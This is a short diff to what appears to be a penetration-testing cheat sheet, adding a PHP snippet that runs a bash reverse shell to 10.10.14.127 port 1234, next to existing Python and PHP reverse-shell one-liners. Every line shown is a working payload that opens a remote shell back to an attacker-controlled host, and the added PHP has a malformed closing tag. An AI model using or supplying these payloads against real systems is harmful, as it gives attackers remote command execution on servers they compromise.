@@ -79,6 +79,12 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ## Reverse shell
 
 ~~~
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.127/1234 0>&1'");
+php?>
+~~~
+
+~~~
 php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ~~~
 
